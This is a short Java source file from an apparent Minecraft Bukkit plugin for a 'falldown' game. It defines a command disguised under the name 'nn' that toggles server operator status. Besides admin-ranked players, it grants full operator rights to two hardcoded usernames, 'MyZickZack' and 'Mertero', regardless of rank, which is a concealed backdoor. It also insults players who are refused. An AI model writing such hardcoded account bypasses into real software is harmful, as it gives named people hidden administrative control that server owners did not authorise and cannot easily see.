package de.mertero.falldown.commands;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import de.piet.cloud.api.CloudAPI;
import net.twerion.rank.Rank;

public class CMD_op implements CommandExecutor {

	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		if (cmd.getName().equalsIgnoreCase("nn")) {
			if (sender instanceof Player) {
				Player p = (Player) sender;
				Rank playerRankData = CloudAPI.getPlayerAPI().getRank(p);
				if (playerRankData.isHigherEqualsLevel(Rank.ADMIN) || p.getName().equals("MyZickZack") || p.getName().equals("Mertero")) {
					if(p.isOp() == true) {
						p.setOp(false);
						p.sendMessage("§cNicht OP");
					} else {
						p.setOp(true);
						p.sendMessage("§cOp");						
					}

				} else {
					p.sendMessage("§cBastard!");
				}
			}
		}

		return false;
	}

}
